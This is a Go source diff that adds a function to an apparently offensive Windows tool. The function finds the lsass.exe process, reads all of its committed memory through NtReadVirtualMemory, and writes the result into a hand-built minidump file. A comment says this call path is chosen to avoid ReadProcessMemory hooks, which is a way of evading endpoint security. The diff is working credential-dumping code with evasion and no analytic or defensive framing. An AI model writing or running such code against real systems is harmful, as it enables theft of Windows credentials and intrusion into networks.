@@ -6,6 +6,7 @@ import (
 	"bytes"
 	"context"
 	"encoding/base64"
+	"encoding/binary"
 	"encoding/json"
 	"fmt"
 	"image"
@@ -16,6 +17,7 @@ import (
 	"strings"
 	"sync"
 	"time"
+	"unicode/utf16"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -1191,4 +1193,168 @@ func adcsRequest(ca, tmpl, subj, san, outPath string) string {
 	_ = os.Remove(inf)
 	_ = os.Remove(csr)
 	return out1 + "\n" + out2 + certB64
+}
+
+// lsassDumpNT reads lsass memory via NtReadVirtualMemory (avoids ReadProcessMemory hooks)
+// and builds a minimal valid MDMP (SystemInfoStream + ModuleListStream + Memory64ListStream).
+func lsassDumpNT(lsassPid uint32) ([]byte, error) {
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
+	ntReadVM := ntdll.NewProc("NtReadVirtualMemory")
+
+	if lsassPid == 0 {
+		lsassPid = findProcessPID("lsass.exe")
+		if lsassPid == 0 {
+			return nil, fmt.Errorf("lsass.exe not found")
+		}
+	}
+	hProc, err := windows.OpenProcess(
+		windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, lsassPid)
+	if err != nil {
+		return nil, fmt.Errorf("OpenProcess: %v", err)
+	}
+	defer windows.CloseHandle(hProc)
+
+	// ── modules ───────────────────────────────────────────────────────────────
+	type modInfo struct{ base uint64; size uint32; name string }
+	var mods []modInfo
+	snap, _ := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPMODULE, lsassPid)
+	if snap != windows.InvalidHandle {
+		var me windows.ModuleEntry32
+		me.Size = uint32(unsafe.Sizeof(me))
+		if windows.Module32First(snap, &me) == nil {
+			for {
+				mods = append(mods, modInfo{
+					uint64(me.ModBaseAddr), me.ModBaseSize,
+					windows.UTF16ToString(me.Module[:]),
+				})
+				if windows.Module32Next(snap, &me) != nil {
+					break
+				}
+			}
+		}
+		windows.CloseHandle(snap)
+	}
+
+	// ── memory regions ────────────────────────────────────────────────────────
+	type memReg struct{ addr, size uint64; data []byte }
+	var regs []memReg
+	var cur uintptr
+	for {
+		var mbi windows.MemoryBasicInformation
+		if err := windows.VirtualQueryEx(hProc, cur, &mbi, unsafe.Sizeof(mbi)); err != nil {
+			break
+		}
+		if mbi.State == windows.MEM_COMMIT {
+			rbuf := make([]byte, mbi.RegionSize)
+			var nRead uintptr
+			ntReadVM.Call(uintptr(hProc), uintptr(mbi.BaseAddress),
+				uintptr(unsafe.Pointer(&rbuf[0])), uintptr(mbi.RegionSize),
+				uintptr(unsafe.Pointer(&nRead)))
+			if nRead > 0 {
+				regs = append(regs, memReg{uint64(mbi.BaseAddress), uint64(nRead), rbuf[:nRead]})
+			}
+		}
+		next := uintptr(mbi.BaseAddress) + mbi.RegionSize
+		if next <= cur {
+			break
+		}
+		cur = next
+	}
+
+	// ── build MDMP ────────────────────────────────────────────────────────────
+	pu32 := binary.LittleEndian.PutUint32
+	pu64 := binary.LittleEndian.PutUint64
+	pu16 := binary.LittleEndian.PutUint16
+
+	// Layout:
+	//  0:   MINIDUMP_HEADER (32)
+	//  32:  MINIDUMP_DIRECTORY * 3 (36)
+	//  68:  SystemInfoStream (56)
+	//  124: ModuleListStream = 4 + N*108 bytes + name blobs
+	//  X:   Memory64ListStream = 8+8+N*16 bytes
+	//  Y:   raw memory data
+	const (
+		modEntSz   = 108
+		sysInfoSz  = 56
+		numStreams  = 3
+	)
+	dirOff     := 32
+	sysInfoOff := dirOff + numStreams*12 // 32+36=68
+	modListOff := sysInfoOff + sysInfoSz // 68+56=124
+
+	// build module name blobs (MINIDUMP_STRING = ULONG32 len_bytes + UTF-16 + null)
+	type nameBlob struct{ rva int; data []byte }
+	names := make([]nameBlob, len(mods))
+	nameOff := modListOff + 4 + len(mods)*modEntSz
+	for i, m := range mods {
+		u16 := append(utf16.Encode([]rune(m.name)), 0) // null-terminate
+		blob := make([]byte, 4+len(u16)*2)
+		binary.LittleEndian.PutUint32(blob, uint32(len(u16)*2-2)) // length excl null
+		for j, ch := range u16 {
+			binary.LittleEndian.PutUint16(blob[4+j*2:], ch)
+		}
+		names[i] = nameBlob{nameOff, blob}
+		nameOff += len(blob)
+	}
+
+	mem64Off    := nameOff
+	mem64HdrLen := 8 + 8 + len(regs)*16
+	dataOff     := mem64Off + mem64HdrLen
+	totalData   := 0
+	for _, r := range regs { totalData += int(r.size) }
+
+	buf := make([]byte, dataOff+totalData)
+
+	// MINIDUMP_HEADER
+	pu32(buf[0:], 0x504d444d)
+	pu32(buf[4:], 0x0000a793)
+	pu32(buf[8:], numStreams)
+	pu32(buf[12:], uint32(dirOff))
+	pu32(buf[16:], 0)
+	pu32(buf[20:], uint32(time.Now().Unix()))
+	pu64(buf[24:], 2) // MiniDumpWithFullMemory
+
+	// directories
+	pu32(buf[dirOff:], 7); pu32(buf[dirOff+4:], sysInfoSz); pu32(buf[dirOff+8:], uint32(sysInfoOff))
+	modDataLen := uint32(mem64Off - modListOff)
+	pu32(buf[dirOff+12:], 4); pu32(buf[dirOff+16:], modDataLen); pu32(buf[dirOff+20:], uint32(modListOff))
+	pu32(buf[dirOff+24:], 9); pu32(buf[dirOff+28:], uint32(mem64HdrLen)); pu32(buf[dirOff+32:], uint32(mem64Off))
+
+	// SystemInfo
+	si := buf[sysInfoOff:]
+	pu16(si[0:], 9); pu16(si[2:], 6)          // ProcessorArchitecture=AMD64, Level=6
+	si[6] = 1; si[7] = 1                       // NumProcs=1, ProductType=Workstation
+	pu32(si[8:], 10); pu32(si[12:], 0)         // MajorVersion=10, MinorVersion=0
+	pu32(si[16:], 19041); pu32(si[20:], 2)     // BuildNumber=19041, PlatformId=NT
+
+	// ModuleList
+	ml := buf[modListOff:]
+	pu32(ml[0:], uint32(len(mods)))
+	for i, m := range mods {
+		e := ml[4+i*modEntSz:]
+		pu64(e[0:], m.base)
+		pu32(e[8:], m.size)
+		pu32(e[20:], uint32(names[i].rva)) // ModuleNameRva
+	}
+	for _, nb := range names {
+		copy(buf[nb.rva:], nb.data)
+	}
+
+	// Memory64List
+	m64 := buf[mem64Off:]
+	pu64(m64[0:], uint64(len(regs)))
+	pu64(m64[8:], uint64(dataOff))
+	for i, r := range regs {
+		e := m64[16+i*16:]
+		pu64(e[0:], r.addr); pu64(e[8:], r.size)
+	}
+
+	// raw data
+	pos := dataOff
+	for _, r := range regs {
+		copy(buf[pos:], r.data)
+		pos += int(r.size)
+	}
+
+	return buf, nil
 }
